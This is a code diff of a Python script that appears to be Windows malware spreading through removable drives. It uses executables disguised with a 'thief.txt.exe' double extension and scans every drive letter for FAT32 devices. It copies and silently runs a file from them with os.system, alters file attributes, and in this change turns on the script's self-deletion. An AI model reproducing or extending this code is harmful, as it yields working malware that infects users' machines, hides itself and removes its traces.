@@ -4,11 +4,11 @@ import subprocess
 import psutil
 import win32api, win32con
 
-DAEMON_NAME="daemon.py"
-THIEF_NAME="thief.txt.py"
-DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
-THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
-ROOT_PATH="D:\\vscode\\SYSTEM\\"
+DAEMON_NAME="daemon.exe"
+THIEF_NAME="thief.txt.exe"
+DAEMON_PATH="C:\\vscode\\SYSTEM\\daemon.exe"
+THIEF_PATH="C:\\vscode\\SYSTEM\\thief.txt.exe"
+ROOT_PATH="C:\\vscode\\SYSTEM\\"
 
 class computer:
     drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
@@ -70,7 +70,7 @@ if not(os.path.exists(path)):
     for d in disks:
         dev=d.device
         if d.fstype=="FAT32" and os.path.exists(dev+getname()):
-            true_file=file()
+            true_file=file(dev+getname())
             true_file.move(path)
 print(path)
 os.system(path)
@@ -79,4 +79,4 @@ os.system(path)
 if target.enermy==False:
     win32api.SetFileAttributes(os.getcwd()+getname(), win32con.FILE_ATTRIBUTE_NORMAL)
     thisfile=file(__file__)
-#    thisfile.delete()
+    thisfile.delete()
